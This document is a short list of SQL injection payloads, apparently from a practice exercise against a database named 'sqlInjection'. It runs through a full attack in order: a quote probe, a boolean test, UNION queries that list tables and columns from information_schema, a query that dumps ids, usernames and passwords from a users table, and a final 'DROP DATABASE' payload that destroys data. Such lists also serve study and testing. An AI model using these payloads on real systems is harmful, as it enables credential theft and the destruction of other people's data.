

%';  --  

%' and 1 = 1;  --  

%' UNION (SELECT 1, 2, 3 FROM mysql);  --  

%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.TABLES);  --  

%' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users');  --  

%' UNION (SELECT id, username, password FROM users);  --  

%'; DROP DATABASE sqlInjection;  --  